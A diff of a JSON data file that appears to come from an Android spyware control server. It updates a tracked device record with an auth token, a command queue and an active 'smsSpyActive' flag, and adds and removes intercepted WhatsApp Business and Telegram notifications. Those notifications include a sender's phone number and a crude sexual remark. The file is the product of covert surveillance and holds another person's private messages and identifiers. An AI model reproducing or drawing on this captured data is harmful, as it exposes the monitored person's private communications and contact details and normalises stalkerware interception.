@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775633704784,
+    "lastSeen": 1775633716790,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "+62 838-1173-3694",
+        "content": "Lu?",
+        "time": "08/04 14:35",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633707412
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎4 pesan dari 3 chat",
+        "time": "08/04 14:35",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633707399
+      },
       {
         "appName": "WA Business",
         "sender": "𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏: Membalas Anda",
@@ -4310,22 +4326,6 @@
         "time": "08/04 14:18",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775632731557
-      },
-      {
-        "appName": "WA Business",
-        "sender": "‎𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏 (2 pesan): Menyebut Anda",
-        "content": "~ ★: @⁨Naxrat⁩  jangan' foto memek ituu punya lu",
-        "time": "08/04 14:18",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775632731439
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "-_-",
-        "time": "08/04 14:18",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632703791
       }
     ],
     "galleryPhotos": [],
